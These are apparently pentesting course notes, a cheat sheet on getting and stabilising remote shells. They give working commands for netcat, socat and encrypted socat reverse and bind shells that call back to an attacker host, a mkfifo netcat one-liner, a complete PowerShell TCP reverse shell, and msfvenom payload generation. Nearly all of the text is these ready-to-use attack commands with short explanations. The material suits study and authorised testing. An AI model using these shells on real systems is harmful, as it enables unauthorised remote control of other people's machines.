found this line too funny - Socat is like netcat on steroids
The `exploit/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.
Msfvenom is used to generate payloads on the fly
[rev shell cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[one more rev shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[seclists](https://github.com/danielmiessler/SecLists) also contains code for shells

- reverse shell - open listener
- bind shell - shell on target, get rce

### netcat
reverse shells - ``nc -lvnp <port-number>``
bind shells - `nc <target-ip> <chosen-port>`

## Netcat shell stabilizing

### 1. python
`python -c 'import pty;pty.spawn("/bin/bash")'`
replace with python2 and python3 respectively

`export TERM=xterm`
gives access to term commands (eg: `clear`)

background the process using `Ctrl + Z`

in our own terminal, we type `stty raw -echo; fg`
it turns off our terminal echo, hence autocomplete, `Ctrl+C` , and arrow keys start working, foregrounds the shell.

if the shell dies, no input is seen, type `reset` and press enter

### 2. rlwrap
windows shell -
`rlwrap nc -lvnp <port>`

linux shell -
do the same as windows then `Ctrl + Z` and then ``stty raw -echo; fg`` in your own terminal

### 3. Socat
limited to linux targets
`sudo python3 -m http.server 80`
`wget <LOCAL-IP>/socat -O /tmp/socat`

transfer socat static compiled binary to target machine

`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`
in windows

`stty -a`
`stty rows <number>`
`stty cols <number>`
fill the numbers and resize the terminal


# socat

### REVERSE SHELL (for basic reverse shell listener)
`socat TCP-L:<port> -`

to connect back -
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes` (windows)
`socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` (linux)

### BIND SHELLS

linux target
`socat TCP-L:<PORT> EXEC:"bash -li"`

windows target
`socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

connecting to waiting listener -
`socat TCP:<TARGET-IP>:<TARGET-PORT> -`


### STABILIZING THE SHELL
``socat TCP-L:<port> FILE:`tty`,raw,echo=0``

special command:
`socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)  
- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
- **setsid**, creates the process in a new session
- **sane**, stabilises the terminal, attempting to "normalise" it.

# SOCAT ENCRYPTED SHELLS

1. generate certificate
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

2. We then need to merge the two created files into a single `.pem` file:
`cat shell.key shell.crt > shell.pem`  

3. Now, when we set up our reverse shell listener, we use:
`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`

`verify=0` to avoid validating the certificate

note : certificate must be used on the device whichever device is listening

to connect back:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`

### BIND SHELL
target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
attacker : `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`

# COMMON SHELL PAYLOADS

`nc -lvnp <PORT> -e /bin/bash`  
Connecting to the above listener with netcat would result in a bind shell on the target.
Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.

netcat bind shell
`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
_The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle._

netcat reverse shell
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

```cmd.exe
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
one liner code (webshell/reverse shell)

[one liner payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

# msfvenom

generating windows reverse shell in exe format
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager

2 types of payloads -
- staged payloads: 2 parts: stager and the shell code, stager establishes connection with the listener and then the shell code is uploaded. This makes sure that it doesn't touch the disk.
- stageless payloads: whatever payload we have used till now, 1 piece of code is uploaded 

payload naming convention- `<OS>/<arch>/<payload>`

`msfvenom --list payloads`

# metasploit multi/handler

Multi/Handler is a superb tool for catching reverse shells.
`msfconsole`
`use multi/handler`

